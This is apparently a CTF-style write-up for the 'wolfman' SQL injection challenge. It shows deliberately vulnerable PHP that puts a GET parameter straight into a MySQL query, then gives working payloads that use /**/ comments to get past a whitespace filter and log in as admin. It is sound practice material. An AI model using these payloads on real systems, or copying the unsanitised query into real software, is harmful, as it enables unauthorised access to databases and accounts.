```php
query : select id from prob_wolfman where id='guest' and pw=''
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>

```

Explain:

So, i just handle only `pw` parameter.

- check prob, ., _, () 
- / /i : no whitespace

Because this lab `not allowed no whitespace`, and this lab using `mysql`, using `inline comment /**/` to bypass this

Payload: 

true condition `'/**/or/**/1=1#` return `guest`

another true condition with `AND`, `'/**/or/**/1=1/**/and/**/id='admin'#` return `admin`

